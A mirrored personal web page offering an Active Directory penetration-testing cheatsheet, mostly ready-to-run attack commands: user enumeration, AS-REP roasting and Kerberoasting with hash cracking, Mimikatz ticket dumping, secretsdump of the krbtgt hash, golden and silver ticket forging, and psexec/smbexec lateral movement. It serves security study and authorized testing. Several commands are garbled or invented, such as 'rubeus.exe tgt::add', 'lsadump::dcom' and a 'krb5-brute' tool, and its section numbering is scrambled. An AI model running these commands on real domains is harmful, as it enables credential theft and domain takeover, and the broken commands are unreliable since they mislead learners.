<!DOCTYPE html>
<html lang="en">


<!-- Mirrored from www.emmanuelsolis.com/ad_pentesting.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Aug 2025 18:43:44 GMT -->
<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">

  <title>Active Directory | Cheatsheet</title>
  <meta content="" name="description">
  <meta content="" name="keywords">

  <!-- Favicons -->
  <link href="img/favicon.png" rel="icon">
  <link href="img/apple-touch-icon.png" rel="apple-touch-icon">

  <!-- Google Fonts -->
  <link
    href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i"
    rel="stylesheet">

  <!-- Vendor CSS Files -->
  <link href="vendor/aos/aos.css" rel="stylesheet">
  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <link href="vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
  <link href="vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
  <link href="vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
  <link href="vendor/swiper/swiper-bundle.min.css" rel="stylesheet">

  <!-- Prism CSS -->
  <link href="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/themes/prism-tomorrow.min.css" rel="stylesheet" />

  <!-- Template Main CSS File -->
  <link href="css/style.css" rel="stylesheet">

  <!-- Open Graph meta tags -->
  <meta property="og:title" content="Active Directory Cheatsheet">
  <meta property="og:description" content="A list of commands and tips for performing Active Directory Pentesting.">
  <meta property="og:image" content="img/favicon.png">
  <meta property="og:url" content="ad_pentesting.html">
  <meta property="og:type" content="website">

  <!-- Twitter Card meta tags -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Active Directory Cheatsheet">
  <meta name="twitter:description" content="A list of commands and tips for performing Active Directory Pentesting.">
  <meta name="twitter:image" content="img/favicon.png">
</head>

<body>

  <!-- ======= Mobile nav toggle button ======= -->
  <i class="bi bi-list mobile-nav-toggle d-xl-none"></i>

  <!-- ======= Header ======= -->
  <header id="header">
    <div class="d-flex flex-column">

      <div class="profile">
        <img src="img/profile-img.jpg" alt="" class="img-fluid rounded-circle">
        <h1 class="text-light"><a href="index-2.html">Emmanuel Solis</a></h1>
        <div class="social-links mt-3 text-center">
          <a href="https://www.linkedin.com/in/emmasolis/" target="_blank" class="linkedin"><i
              class="bx bxl-linkedin"></i></a>
          <a href="https://github.com/emmasolis1" target="_blank" class="github"><i class="bx bxl-github"></i></a>
        </div>
      </div>

      <nav id="navbar" class="nav-menu navbar">
        <ul>
          <li><a href="index-2.html" class="nav-link scrollto"><i class="bi bi-house navicon"></i>Home</a></li>
          <li><a href="resume.html" class="nav-link scrollto"><i
                class="bi bi-file-earmark-text navicon"></i><span>Resume</span></a></li>
          <li><a href="portfolio.html" class="nav-link scrollto"><i class="bi bi-images navicon navicon"></i><span>Portfolio</span></a></li>
          <li><a href="https://coff.ee/emmanuelsolis" target="_blank" class="nav-link scrollto"><i class="bi bi-heart navicon"></i>Buy Me a Coffee</a></li>
          <li class="dropdown">
            <a href="cheatsheets.html" class="nav-link scrollto active" onclick="toggleSubmenu(event)"><i class="bi bi-hdd-stack navicon"></i>Cheatsheets <span class="arrow">▼</span></a>
            <ul id="submenu" class="submenu open">
              <li><a href="ad_pentesting.html" class="nav-link scrollto active"><i class="bi bi-shield-lock navicon"></i>Active Directory Pentesting</a></li>
              <li><a href="mobile_pentesting.html" class="nav-link scrollto"><i class="bi bi-phone navicon"></i>Mobile Pentesting</a></li>
              <li><a href="oscp.html" class="nav-link scrollto"><img src="img/oscp_icon.png" alt="OSCP Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSCP+</a></li>
              <li><a href="oswp.html" class="nav-link scrollto"><img src="img/oswp_icon.png" alt="OSWP Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSWP</a></li>
              <li><a href="pjmt.html" class="nav-link scrollto"><img src="img/pjmt_icon.png" alt="PJMT Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">PJMT</a></li>
              <li><a href="red_teaming.html" class="nav-link scrollto"><i class="bi bi-shield-lock navicon"></i>Red Teaming</a></li>
              <li><a href="security_plus.html" class="nav-link scrollto"><img src="img/security_icon.png" alt="Security+ Icon" style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">Security+</a></li>
            </ul>
          </li>
        </ul>
      </nav><!-- .nav-menu -->
    </div>
  </header><!-- End Header -->

  <main id="main">
    <!-- ======= Breadcrumbs ======= -->
    <section id="breadcrumbs" class="breadcrumbs">
      <div class="container">

        <div class="d-flex justify-content-between align-items-center">
          <h2>Active Directory Cheatsheet</h2>
          <ol>
            <li><a href="index-2.html">Home</a></li>
            <li>Active Directory Cheatsheet</li>
          </ol>
        </div>

      </div>
    </section><!-- End Breadcrumbs -->

    <!-- ======= Cheatsheet Section ======= -->
    <section id="cheatsheet" class="cheatsheet">
      <div class="container">

        <div class="row gy-4">
          <div class="col-lg-12">
            <!-- ======= Disclaimer Alert ======= -->
            <div class="alert alert-warning alert-dismissible fade show" role="alert" data-aos="fade-right">
              <strong>Disclaimer:</strong> This site compiles various <u>publicly available</u> cheatsheets, commands,
              and guides, along with some personal edits. Never perform testing if you do not have proper authorization. If you have any concerns about the content, please review the references section. For
              further inquiries, feel free to contact me.
              <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
            </div>
            <div class="cheatsheet-content">
              <h2 id="1-active-directory-theory">1. <span class="emoji">📜</span> Active Directory Theory</h2>
              <h3 id="11-overview">1.1 Overview</h3>
              <ul>
                <li>Active Directory (AD) manages objects (e.g., computers, users) in a domain, such as
                  <code>domain.com</code>, and organizes them into <strong>Organizational Units (OUs)</strong>.
                </li>
                <li><strong>Domain Controllers (DCs)</strong> store all the password hashes for domain users.</li>
                <li>To control AD fully, target the <strong>Domain Admins group</strong> or a <strong>Domain
                    Controller</strong>.</li>
                <li>Services like Exchange or IIS integrate with AD using <strong>Service Principal Names
                    (SPNs)</strong>, which identify services and link them to service accounts.</li>
                <li><strong>Kerberos</strong> is used to authenticate users and services using tickets,
                  and if I have an user&#39;s ticket I can impersonate that user.</li>
              </ul>
              <h3 id="12-authentication">1.2 Authentication</h3>
              <ul>
                <li><strong>NTLM</strong>: Uses a challenge/response protocol to authenticate users without transmitting
                  passwords.</li>
                <li><strong>Kerberos</strong>: Relies on a <strong>Key Distribution Center (KDC)</strong> to issue
                  <strong>Ticket Granting Tickets (TGTs)</strong> and <strong>Service Tickets (TGSs)</strong> for user
                  authentication.
                </li>
                <li><strong>TGT</strong>: Provides authentication validity for up to 10 hours, and a session key for
                  accessing domain resources.</li>
                <li><strong>TGS</strong>: Allows users to access services using SPNs, with permissions granted based on
                  group membership.</li>
              </ul>
              <h3 id="13-credential-storage--hash-dumping">1.3 Credential Storage &amp; Hash Dumping</h3>
              <ul>
                <li><strong>LSASS</strong> stores password hashes for single sign-on (SSO). With admin access, tools
                  like <strong>Mimikatz</strong> can dump:<ul>
                    <li>Password hashes.</li>
                    <li><strong>TGTs</strong> and <strong>TGSs</strong> (for Kerberoasting or forgery).</li>
                  </ul>
                </li>
                <li><strong>Kerberoasting</strong>: Crack the service account&rsquo;s password hash from TGS tickets to
                  reveal
                  the clear-text password.</li>
                <li><strong>Silver/Golden Tickets</strong>: Forging TGS tickets using cracked SPN password hashes to
                  impersonate users.</li>
              </ul>
              <h3 id="14-common-attack-vectors">1.4 Common Attack Vectors</h3>
              <ul>
                <li><strong>AS-REP Roasting</strong>: Target accounts without <strong>Kerberos
                    Pre-Authentication</strong> (indicated by the <code>DONT_REQ_PREAUTH</code> flag), extract AS-REP
                  responses, and attempt to crack the encrypted part offline.</li>
                <li><strong>Kerberoasting</strong>: Target SPNs, extract TGS tickets, crack the passwords offline.</li>
                <li><strong>Pass-the-Hash (PtH)</strong>: Reuse NTLM hashes to authenticate to services without cracking
                  the password.</li>
                <li><strong>Pass-the-Ticket (PtT)</strong>: Use stolen Kerberos tickets to move laterally or maintain
                  persistence.</li>
                <li><strong>Silver Ticket</strong>: Enables attackers to forge a TGS ticket for a specific
                  service using the NTLM hash of the service account. This allows unauthorized access to that service
                  without needing user credentials.</li>
                <li><strong>Golden Ticket</strong>: Allows attackers to forge a TGT using the KRBTGT account
                  hash, enabling them to impersonate any user in the domain, including privileged accounts, and gain
                  extensive access across the network.</li>
                <li><strong>Kerberos Delegation Abuse</strong>:<ul>
                    <li><strong>Unconstrained Delegation</strong>: Allows attackers to impersonate any user, including
                      privileged ones, by using a high-privileged TGT.</li>
                    <li><strong>Constrained Delegation</strong>: Allows impersonation of specific users for services
                      where delegation has been configured; so restricts the impersonation capabilities to specific
                      services.</li>
                  </ul>
                </li>
                <li><strong>DC Sync</strong>: Allows attackers with certain privileges (e.g., <em>Replicating Directory
                    Changes</em>) to impersonate a Domain Controller and request <strong>password hashes,</strong>
                  including <strong>NTLM</strong> hashes, from the AD; the user needs the permissions
                  <code>DC-Replication-Get-Changes</code> along with the privilege <em>GetChangesAll</em>.
                </li>
              </ul>
              <h3 id="15-lateral-movement">1.5 Lateral Movement</h3>
              <ul>
                <li><strong>Pass the Hash (PtH)</strong>: Use NTLM hashes to authenticate to remote systems without
                  needing the plaintext password.</li>
                <li><strong>Overpass the Hash</strong>: Use an NTLM hash to request a TGT for Kerberos-based services,
                  enabling domain-wide movement without the need for the actual password.</li>
              </ul>
              <h3 id="16-persistence">1.6 Persistence</h3>
              <ul>
                <li><strong>Golden Ticket Attack</strong>: By obtaining the <strong>krbtgt</strong> password hash, an
                  attacker can forge <strong>TGTs</strong> and impersonate any user.</li>
                <li><strong>DCSync Attack</strong>: Request replication updates from DCs to retrieve password hashes of
                  every AD user.</li>
              </ul>
              <h2 id="12-active-directory-enumeration">12. <span class="emoji">🕵️‍♂️</span> Active Directory
                Enumeration</h2>
              <h3 id="121-initial-recon-with-nmap">12.1 Initial Recon with Nmap</h3>
              <p>Start by scanning the target with Nmap to identify potential services and domain controllers (DC):</p>
              <pre><code class="language-bash">nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49152-65535 -sS -sV -oA ad-enum &lt;target-ip&gt;
</code></pre>
              <p><strong>Common Active Directory ports</strong>:</p>
              <ul>
                <li><strong>53</strong>: DNS</li>
                <li><strong>88</strong>: Kerberos</li>
                <li><strong>135</strong>: RPC</li>
                <li><strong>139/445</strong>: SMB</li>
                <li><strong>389/636</strong>: LDAP/LDAPS</li>
                <li><strong>464</strong>: Kerberos Password Change</li>
                <li><strong>5985</strong>: WinRM</li>
              </ul>
              <p><strong>Recommended Strategy</strong>:</p>
              <ol>
                <li><strong>Perform LDAP Search</strong>: retrieve potential user and password information.</li>
              </ol>
              <pre><code class="language-bash">ldapsearch -x -H ldap://&lt;dc-ip&gt; -b &quot;dc=domain,dc=com&quot;
</code></pre>
              <ol start="2">
                <li><strong>Enumerate DNS</strong>: gather information about key servers within the domain.</li>
              </ol>
              <pre><code class="language-bash">gobuster dns -d domain.com -t 25 -w /us/share/wordlists/Seclist/Discovery/DNS/subdomain-top2000.txt
</code></pre>
              <ol start="3">
                <li>
                  <p><strong>Enumerate LDAP Services</strong>:</p>
                </li>
              </ol>
              <pre><code class="language-bash">nmap -n -sV --script &quot;ldap* and not brute&quot; -p 389 &lt;dc-ip&gt;
</code></pre>
              <ol start="5">
                <li><strong>Find Valid Users</strong>:</li>
              </ol>
              <pre><code class="language-bash"># Using Kerbrute
./kerbrute_linux_amd64 userenum -d [domain].com /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames

# Using CrackMapExec
crackmapexec smb [domain].com -u &#39;&#39; -p &#39;&#39; --users
</code></pre>
              <ol start="6">
                <li><strong>Enumerate All AD Users</strong>: this has to be done after having valid credentials.</li>
              </ol>
              <pre><code class="language-bash"># Using GetAdUsers.py (same tool)
impacket-GetADUsers -all -dc-ip &lt;dc_ip&gt; -u &lt;username&gt; -p &lt;password&gt; &lt;domain&gt;

# Using Enum4Linux
enum4linux -a -u &quot;&lt;username&gt;&quot; -p &quot;&lt;password&gt;&quot; &lt;dc_ip&gt;
</code></pre>
              <h4 id="211-dns-enumeration-port-53">2.1.1 DNS Enumeration (Port 53)</h4>
              <p><strong>Nmap Scripting Scan</strong></p>
              <pre><code class="language-bash">nmap --script dns-brute,dns-nsid,dns-recursion,dns-zone-transfer -p 53 &lt;target_ip&gt;
</code></pre>
              <p><strong>Enumerating AD Domain via DNS</strong></p>
              <pre><code class="language-bash">nmap -p 53 --script &quot;dns-nsid,dns-srv-enum&quot; &lt;target_ip&gt;
</code></pre>
              <p><strong>Zone Transfer</strong>: test for DNS zone transfer to retrieve a list of domain records.</p>
              <pre><code class="language-bash">dig axfr @&lt;dc-ip&gt; &lt;domain&gt;
</code></pre>
              <p><strong>DNS Record Lookup</strong>: query specific domain records, such as domain controllers and mail
                servers.</p>
              <pre><code class="language-bash">dig A &lt;domain&gt; @&lt;dc-ip&gt;
dig SRV _ldap._tcp.dc._msdcs.&lt;domain&gt; @&lt;dc-ip&gt;
</code></pre>
              <p><strong>Basic DNS Enumeration</strong></p>
              <pre><code class="language-bash">dig axfr &lt;domain_name&gt; @&lt;dns_server_ip&gt;  # Attempt zone transfer
dig ANY &lt;domain_name&gt; @&lt;dns_server_ip&gt;  # Retrieve all records
nslookup
&gt; server &lt;dns_server_ip&gt;
&gt; set type=any
&gt; &lt;domain_name&gt;  # Query any records
</code></pre>
              <p><strong>Zone Transfer</strong></p>
              <pre><code class="language-bash">dnsrecon -d &lt;domain_name&gt; -n &lt;dns_server_ip&gt; -t axfr

dnsenum --enum -f /usr/share/dnsenum/dns.txt --dnsserver &lt;dns_server_ip&gt; &lt;domain_name&gt;
</code></pre>
              <p><strong>Reverse Lookup</strong></p>
              <pre><code class="language-bash">nmap -sL &lt;target_ip_range&gt; | grep &quot;Nmap scan report&quot;  # Reverse DNS lookup for a range
</code></pre>
              <p><strong>DNS Cache Snooping</strong></p>
              <pre><code class="language-bash">dig @&lt;dns_server_ip&gt; -t A +norecurse &lt;target_domain&gt;
</code></pre>
              <p><strong>Enumerate DNS with PowerShell (Windows)</strong></p>
              <pre><code class="language-powershell">Resolve-DnsName -Name &lt;domain_name&gt; -Server &lt;dns_server_ip&gt; -DnsOnly
</code></pre>
              <h4 id="212-kerberos-enumeration-port-88">2.1.2 Kerberos Enumeration (Port 88)</h4>
              <p><strong>Nmap Scripting Scan</strong></p>
              <pre><code class="language-bash"># Check for Kerberos service availability and get basic information
nmap -p 88 --script kerberos-enum-users &lt;target_ip&gt;

# Check for common Kerberos vulnerabilities
nmap -p 88 --script kerberos-brute &lt;target_ip&gt;

# Enumerate SPNs (Service Principal Names)
nmap -p 88 --script krb5-enum-users,krb5-scan &lt;target_ip&gt;
</code></pre>
              <p><strong>AS-REP Roasting</strong>: extract accounts with <strong>pre-authentication disabled</strong>
                using <code>GetNPUsers.py</code> (<code>impacket-GetNPUsers</code>); keep in mind that should also use
                <code>kerbrute</code> to find possible valid usernames, commands for this are in the Section 1.4.7.
              </p>
              <pre><code class="language-bash"># This is the same tool as impacket-GetNPUsers.
GetNPUsers.py &lt;domain&gt;/ -usersfile users.txt -dc-ip &lt;dc-ip&gt; -format hashcat
or
GetNPUsers.py &lt;domain&gt;/ -no-pass -usersfile &lt;path_to_userlist&gt; -dc-ip &lt;domain_controller_ip&gt;

# Crack the found hashes
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
</code></pre>
              <p><strong>Kerberoasting</strong>: use <strong>GetUserSPNs.py</strong> to extract SPNs.</p>
              <pre><code class="language-bash">GetUserSPNs.py &lt;domain&gt;/&lt;username&gt;:&lt;password&gt; -dc-ip &lt;dc-ip&gt;

# Crack the resulting hash
hashcat -m 13100 kerberoast.txt rockyou.txt
</code></pre>
              <p><strong>Enumerate Kerberos Principal Names</strong>: use <code>kerbrute</code> to enumerate valid user
                accounts by attempting to authenticate with a list of usernames.</p>
              <pre><code class="language-bash">kerbrute userenum -d &lt;domain&gt; -p &lt;userlist&gt; &lt;target_ip&gt;
or
./kerbrute_linux_amd64 userenum -d &lt;target_ip&gt; /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
</code></pre>
              <p><strong>Perform Kerberos Ticket Extraction (AS-REP Roasting)</strong>: request
                <strong>non-preauthenticated Kerberos</strong> tickets for a list of users.
              </p>
              <pre><code class="language-bash">impacket-GetNPUsers -dc-ip &lt;dc_ip&gt; -request -usersfile &lt;userlist&gt; &lt;target_domain&gt;
</code></pre>
              <p><strong>Perform Kerberos Ticket Request with AS-REP Roasting</strong>: request a Ticket Granting Ticket
                (TGT) for a specific user.</p>
              <pre><code class="language-bash">impacket-GetTGT -dc-ip &lt;dc_ip&gt; -outputfile &lt;outputfile&gt; &lt;username&gt;@&lt;domain&gt;
</code></pre>
              <p><strong>Crack Kerberos Tickets</strong></p>
              <pre><code class="language-bash">john --wordlist=&lt;wordlist&gt; &lt;ticket_file&gt;
# or
hashcat -m 13100 &lt;ticket_file&gt; &lt;wordlist&gt;
</code></pre>
              <p><strong>Kerberos Ticket Extraction</strong>: request a TGT or Service Ticket (TGS) using specified
                credentials.</p>
              <pre><code class="language-bash"># Request a TGT (Ticket Granting Ticket)
python3 GetTGT.py -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/&lt;username&gt;:&lt;password&gt;

# Request a Service Ticket (TGS)
python3 GetST.py -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/&lt;username&gt;:&lt;password&gt; -spn &lt;service&gt;/&lt;target&gt;
</code></pre>
              <p><strong>Kerberoasting</strong>: extract and crack service tickets to gain access to service accounts.
              </p>
              <pre><code class="language-bash"># Extract all service tickets for offline cracking
impacket-GetUserSPNs -dc-ip &lt;dc_ip&gt; -outputfile &lt;tickets_file&gt; &lt;domain&gt;/&lt;username&gt;:&lt;password&gt;

# Crack the extracted tickets with John the Ripper or Hashcat
john --wordlist=&lt;wordlist&gt; &lt;tickets_file&gt;
# or
hashcat -m 13100 &lt;tickets_file&gt; &lt;wordlist&gt;
</code></pre>
              <p><strong>Kerberos Brute Forcing</strong>: perform brute force attacks on Kerberos tickets.</p>
              <pre><code class="language-bash">krb5-brute -d &lt;domain&gt; -t &lt;target_ip&gt; -u &lt;username&gt; -p &lt;password_list&gt;
</code></pre>
              <p><strong>Kerberos Ticket Manipulation</strong>: use tools to request, manipulate, and renew Kerberos
                tickets for privilege escalation or impersonation.</p>
              <pre><code class="language-bash"># Renew a TGT (for Kerberos ticket manipulation)
python3 psexec.py &lt;domain&gt;/&lt;username&gt;:&lt;password&gt;@&lt;target_ip&gt; -impersonate-user &lt;target_user&gt;

# Perform Kerberos attacks with Rubeus
rubeus.exe asktgt /user:&lt;username&gt; /rc4:&lt;password&gt;
rubeus.exe tgtdeleg /user:&lt;username&gt; /rc4:&lt;password&gt;
rubeus.exe s4u /user:&lt;username&gt; /rc4:&lt;password&gt; /impersonateuser:&lt;target_user&gt;
</code></pre>
              <p><strong>Kerberos Ticket Dumping</strong>: extract Kerberos tickets from memory for offline analysis.
              </p>
              <pre><code class="language-powershell"># Dump Kerberos tickets from memory using Mimikatz
mimikatz &quot;lsadump::dcom&quot; &quot;sekurlsa::tickets /export&quot;
</code></pre>
              <p><strong>Kerberos Pre-Authentication</strong>: identify weak configurations that might allow attackers
                to perform brute force attacks.</p>
              <pre><code class="language-bash"># Test for weak pre-authentication configurations
python3 kerbrute.py -d &lt;domain&gt; -u &lt;user_list&gt; -p &lt;password_list&gt; -dc &lt;dc_ip&gt;
</code></pre>
              <p><strong>Kerberos Silver Ticket Attacks</strong>: forge high-value Kerberos tickets for access and
                privilege escalation.</p>
              <pre><code class="language-bash"># Create a silver ticket with Rubeus
rubeus.exe tgt::add /user:&lt;username&gt; /rc4:&lt;password&gt; /sid:&lt;domain_sid&gt; /domain:&lt;domain&gt;
</code></pre>
              <p><strong>Steps to Perform Silver Ticket Attack</strong></p>
              <pre><code class="language-bash"># 1. Obtain a Valid TGT (Ticket Granting Ticket)
impacket-GetTGT -dc-ip &lt;dc_ip&gt; -outputfile &lt;tgt_file&gt; &lt;user&gt;@&lt;domain&gt;

# 2. Forge a Silver Ticket
impacket-atexec -target-ip &lt;target_ip&gt; -service &lt;service&gt; -ticket &lt;ticket_file&gt; &lt;username&gt;
</code></pre>
              <p><strong>Kerberos Golden Ticket Attacks</strong>: forge high-value Kerberos tickets for access and
                privilege escalation.</p>
              <pre><code class="language-bash"># Create a golden ticket with Rubeus
rubeus.exe tgt::add /user:&lt;username&gt; /rc4:&lt;password&gt; /domain:&lt;domain&gt; /sid:&lt;domain_sid&gt; /rc4:&lt;krbtgt_hash&gt;
</code></pre>
              <p><strong>Steps to Perform Golden Ticket Attack</strong></p>
              <pre><code class="language-bash"># 1. Obtain KRBTGT NTLM Hash
impacket-secretsdump -outputfile &lt;dump_file&gt; &lt;target_domain&gt;/&lt;username&gt;:&lt;password&gt;@&lt;dc_ip&gt;

# 2. Generate a Golden Ticket
ticketer -user &lt;user&gt; -domain &lt;domain&gt; -sid &lt;domain_sid&gt; -krbtgt &lt;krbtgt_hash&gt; -output &lt;ticket_file&gt;

# 3. Use the Golden Ticket
impacket-smbexec -target-ip &lt;target_ip&gt; -ticket &lt;ticket_file&gt; &lt;username&gt;

# (Optional) Pass the Golden Ticket
impacket-psexec -target-ip &lt;target_ip&gt; -ticket &lt;ticket_file&gt; &lt;username&gt;
</code></pre>
              <p><strong>Additional Reference:</strong> <a
                  href="https://www.tarlogic.com/blog/how-to-attack-kerberos/">https://www.tarlogic.com/blog/how-to-attack-kerberos/</a>
              </p>
              <h4 id="213-ldap-enumeration-port-389636">2.1.3 LDAP Enumeration (Port 389/636)</h4>
              <p><strong>Nmap Scripting Scan</strong></p>
              <pre><code class="language-bash">nmap -n -sV --script &quot;ldap* and not brute&quot; &lt;target_ip&gt;
</code></pre>
              <p><strong>Basic LDAP Search</strong>: query the LDAP service for domain information</p>
              <pre><code class="language-bash">ldapsearch -x -h &lt;dc-ip&gt; -b &quot;dc=domain,dc=com&quot; &quot;(objectClass=*)&quot;
or
ldapsearch -x -H ldap://&lt;dc-ip&gt; -b &quot;dc=domain,dc=com&quot;
</code></pre>
              <p><strong>Extract AD Users and Groups</strong></p>
              <pre><code class="language-bash"># List domain users
ldapsearch -x -h &lt;dc-ip&gt; -b &quot;dc=domain,dc=com&quot; &quot;(objectClass=user)&quot; sAMAccountName

# List domain groups
ldapsearch -x -h &lt;dc-ip&gt; -b &quot;dc=domain,dc=com&quot; &quot;(objectClass=group)&quot; cn
</code></pre>
              <p><strong>Ldapsearch Basic Enumeration</strong></p>
              <pre><code class="language-bash"># Basic LDAP query
ldapsearch -x -H ldap://&lt;target_ip&gt;

# Basic LDAP Search for a base-level
ldapsearch -h &lt;target_ip&gt; -x -s base

# Get Naming Contexts
ldapsearch -x -H ldap://&lt;target_ip&gt; -s base namingcontexts

# Search in a Specific Base Domain Name
ldapsearch -x -H ldap://&lt;target_ip&gt; -b &quot;DC=&lt;domain&gt;,DC=&lt;tld&gt;&quot;

# Enumerate users using LDAP
ldapsearch -v -x -b &quot;DC=&lt;domain&gt;,DC=&lt;tld&gt;&quot; -H &quot;ldap://&lt;target_ip&gt;&quot; &quot;(objectclass=*)&quot;

# Retrieve users Account Name
ldapsearch -v -x -b &quot;DC=&lt;domain&gt;,DC=&lt;tld&gt;&quot; -H &quot;ldap://&lt;target_ip&gt;&quot; &quot;(objectclass*)&quot; | grep sAMAccountName:

# Search with Filters
ldapsearch -x -H ldap://&lt;target_ip&gt; -b &quot;DC=&lt;domain&gt;,DC=&lt;tld&gt;&quot; &quot;(objectclass=user)&quot;
ldapsearch -x -H ldap://&lt;target_ip&gt; -b &quot;DC=&lt;domain&gt;,DC=&lt;tld&gt;&quot; &quot;(objectclass=group)&quot;

# Searching with authentication
ldapsearch -h &lt;target_ip&gt; -x -D &#39;&lt;domain&gt;\&lt;user&gt;&#39; -w &#39;&lt;password&gt;&#39; -b &quot;DC=&lt;domain&gt;,DC=&lt;tld&gt;&quot;

# Searching terms
ldapsearch -H ldap://&lt;target_ip&gt; -x -D &#39;&lt;domain&gt;\&lt;user&gt;&#39; -w &#39;&lt;password&gt;&#39; -b &quot;DC=&lt;domain&gt;,DC=&lt;tld&gt;&quot; &quot;[term]&quot;

# Specifies the value term to return
ldapsearch -H ldap://&lt;target_ip&gt; -x -D &#39;&lt;domain&gt;\&lt;user&gt;&#39; -w &#39;&lt;password&gt;&#39; -b &quot;DC=&lt;domain&gt;,DC=&lt;tld&gt;&quot; &quot;&lt;term&gt;&quot; &lt;additionalTerm&gt;
</code></pre>
              <p><strong>Check Pre-Authentication for Users</strong></p>
              <pre><code class="language-bash">kerbrute userenum -d &lt;domain&gt; --dc &lt;dc_ip&gt; &lt;userlist&gt;
</code></pre>
              <p><strong>Useful Search Terms</strong></p>
              <pre><code class="language-bash"># Search Terms to Find Cleartext Passwords
# Search for ms-MCS-AdmPwd (local administrator passwords)
(ms-MCS-AdmPwd=*)

# Search for attributes containing &#39;password&#39; in description
(description=*password*)

# Search for LAPS expiration time (to identify potential password management)
(ms-MCS-AdmPwdExpirationTime=*)

# Search for common weak passwords in attributes like description
(description=*(123456*|password*|qwerty*|letmein*))

# General LDAP Search Filters
# Search for All Users
(objectClass=user)

# Search for All Computers
(objectClass=computer)

# Search for All Groups
(objectClass=group)

# Search for Disabled Accounts
(userAccountControl:1.2.840.113556.1.4.803:=2)

# Search for Expired Accounts
(&amp; (objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!(pwdLastSet=0)))

# Search for Specific Group Membership
(&amp;(objectClass=user)(memberOf=CN=GroupName,OU=Groups,DC=domain,DC=com))

# Search for Users with Specific Attributes
# For users with a specific email domain
(mail=*@example.com)
# For users with a specific title
(title=Manager)

# Specific Attributes

# Search for Password Last Set
(pwdLastSet=*)

# Search for Accounts with Expired Passwords
(&amp; (objectClass=user)(pwdLastSet&lt;=0))

# Search for Accounts in a Specific Organizational Unit (OU)
(distinguishedName=*,OU=Sales,DC=domain,DC=com)

# Security-Related Searches

# Search for Accounts with Kerberos Pre-Authentication Disabled
(userAccountControl:1.2.840.113556.1.4.803:=4194304)

# Search for Service Principal Names (SPNs)
(servicePrincipalName=*)

# Search for Delegated Users
(msDS-AllowedToDelegateTo=*)

# Search for Accounts with Privileges
(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=com)

# Other Useful Searches

# Search for All Organizational Units
(objectClass=organizationalUnit)

# Search for Active Directory Certificate Services
(objectClass=cACertificate)

# Search for All Attributes of a Specific User
(sAMAccountName=username)

# Search for Accounts with Specific Notes or Descriptions
(description=*keyword*)

# Search for all objects in the directory
(objectClass=*)

# Search for service accounts
(objectCategory=serviceAccount)

# Search for accounts with specific group memberships (replace &#39;GroupName&#39;)
(memberOf=CN=GroupName,OU=Groups,DC=domain,DC=com)

# Search for computer accounts
(objectClass=computer)

# Search for users in a specific organizational unit (replace &#39;OU=Users&#39;)
(ou=OU=Users,DC=domain,DC=com)

# Search for all accounts with specific attributes
(pwdLastSet=0)
</code></pre>
              <h4 id="214-smbnetbios-enumeration-port-445">2.1.4 SMB/NetBIOS Enumeration (Port 445)</h4>
              <p><strong>Host Enumeration</strong></p>
              <pre><code class="language-bash"># Nmap scan
nmap -v -p 139,445 [IP]
nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery &lt;ip&gt;

# NetBIOS Scan
sudo nbtscan -r 192.168.50.0/24

# Windows Network View
net view \\[domainName] /all
</code></pre>
              <p><strong>Nmap Scripting Scan</strong></p>
              <pre><code class="language-bash">nmap --script smb-enum-shares.nse -p445 &lt;ip&gt;

nmap --script smb-enum-users.nse -p445 &lt;ip&gt;

nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-services.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse -p445 &lt;ip&gt;

nmap -p139,445 --script &quot;smb-vuln-* and not(smb-vuln-regsvc-dos)&quot; --script-args smb-vuln-cve-2017-7494.check-version,unsafe=1 &lt;IP&gt;

nmap --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-cve-2017-7494.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-regsvc-dos.nse,smb-vuln-webexec.nse -p445 &lt;ip&gt;

nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 &lt;ip&gt;
</code></pre>
              <p><strong>SMB Shares Enumeration</strong></p>
              <pre><code class="language-bash"># Use smbclient or enum4linux to enumerate SMB shares.
smbclient -L //&lt;dc-ip&gt; -U &quot;guest&quot;

# List shares using CrackMapExec (CME).
crackmapexec smb &lt;dc-ip&gt; -u &#39;&#39; -p &#39;&#39; --shares
</code></pre>
              <p><strong>Enumerate Users</strong></p>
              <pre><code class="language-bash"># Perform null session enumeration to list domain users.
rpcclient -U &quot;&quot; &lt;dc-ip&gt; --command=&quot;enumdomusers&quot;

# Or use CME for RID cycling.
crackmapexec smb &lt;dc-ip&gt; --rid-brute
</code></pre>
              <p><strong>Advanced Enumeration</strong></p>
              <pre><code class="language-bash"># Network Packet Analysis: captures and analyzes packets related to SMB traffic on port 139, looking for specific patterns
